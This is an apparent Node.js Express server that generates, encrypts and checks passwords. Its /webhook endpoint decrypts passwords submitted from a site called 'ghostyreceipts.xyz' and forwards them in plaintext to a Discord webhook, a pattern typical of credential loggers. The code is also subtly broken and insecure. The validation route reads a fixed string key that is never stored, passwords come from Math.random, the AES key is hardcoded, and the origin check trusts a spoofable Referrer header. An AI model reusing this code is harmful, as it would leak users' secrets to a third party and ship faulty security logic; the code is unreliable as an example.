import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';
import bodyParser from 'body-parser';
import CryptoJS from 'crypto-js';
import rateLimit from 'express-rate-limit';

const app = express();
const encryptionKey = "your_secret_key"; // Replace with your real secret key

// Rate-limiting middleware
const limiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 5, // Max 5 requests per minute
    message: { error: "Too many requests from this IP. Please try again in 1 minute." },
    headers: true,
});

app.use(cors());
app.use(bodyParser.json());

// In-memory store for passwords and timestamps
const passwordStore = new Map();

// Function to check if the password was used in the last 5 minutes
function isPasswordRecent(password) {
    const now = Date.now();
    const recentPassword = passwordStore.get(password);
    if (recentPassword && now - recentPassword < 5 * 60 * 1000) {
        return true;
    }
    return false;
}

// Function to generate a random password
function generateRandomPassword() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+';
  let password = '';
  for (let i = 0; i < 12; i++) {
      password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

// Generate a random password and encrypt it
app.get("/generate-password", (req, res) => {
  const password = generateRandomPassword();
  const encryptedPassword = CryptoJS.AES.encrypt(password, encryptionKey).toString();
  passwordStore.set(encryptedPassword, Date.now());
  res.json({ encryptedPassword });
});

// Validate the password submitted by the user
app.post("/validate-password", (req, res) => {
  const userPassword = req.body.password;
  const encryptedPassword = passwordStore.get("encryptedPassword");

  const bytes = CryptoJS.AES.decrypt(encryptedPassword, encryptionKey);
  const decryptedPassword = bytes.toString(CryptoJS.enc.Utf8);

  if (userPassword === decryptedPassword) {
    res.status(200).json({ success: true, message: "Password correct!" });
  } else {
    res.status(403).json({ success: false, message: "Incorrect password." });
  }
});

// Webhook handling for password submission (if required)
app.post("/webhook", limiter, async (req, res) => {
    try {
        const referrer = req.get("Referrer");
        if (!referrer || !referrer.startsWith("https://ghostyreceipts.xyz")) {
            return res.status(403).send("Forbidden");
        }

        const encryptedMessage = req.body.password;
        const bytes = CryptoJS.AES.decrypt(encryptedMessage, encryptionKey);
        const decryptedMessage = bytes.toString(CryptoJS.enc.Utf8);

        if (isPasswordRecent(decryptedMessage)) {
            return res.status(200).send("Password was recently used, not sending to webhook");
        }

        passwordStore.set(decryptedMessage, Date.now());

        const webhookData = { content: decryptedMessage };
        const webhookUrl = "https://discord.com/api/webhooks/your_webhook_url";

        let webhookResponse = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(webhookData),
        });

        if (webhookResponse.status === 429) {
            const retryAfter = webhookResponse.headers.get('Retry-After') || 5;
            await delay(retryAfter * 1000);
            webhookResponse = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(webhookData),
            });
        }

        if (!webhookResponse.ok) {
            console.error("Webhook failed:", await webhookResponse.text());
            return res.status(500).send("Failed to send data to webhook");
        }

        res.status(200).send("Data sent securely");
    } catch (error) {
        res.status(500).send("Error processing request");
    }
});

// Delay function for retries
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
